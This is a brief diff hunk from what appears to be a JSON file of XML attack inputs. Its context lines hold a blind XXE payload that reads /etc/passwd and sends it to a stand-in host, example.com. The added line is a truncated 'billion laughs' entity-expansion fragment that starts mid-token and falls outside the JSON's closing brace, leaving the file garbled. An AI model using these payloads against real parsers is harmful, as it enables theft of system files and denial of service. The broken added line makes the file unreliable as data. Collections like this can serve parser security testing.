@@ -9,3 +9,4 @@
   "xml": "<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n<!ELEMENT foo (#ANY)>\n<!ENTITY % xxe SYSTEM \"file:///etc/passwd\">\n<!ENTITY blind SYSTEM \"https://www.example.com/?%xxe;\">]><foo>&blind;</foo>"
 }
 
+"scaer"><!ENTITY xeecodoi1 "&xeecodoi0;&xeecodoi0;"><!ENTITY xeecodoi2 "&xeecodoi1;&xeecodoi1;"><!ENTITY xeecodoi3 "&xeecodoi2;&xeecodoi2;">]>
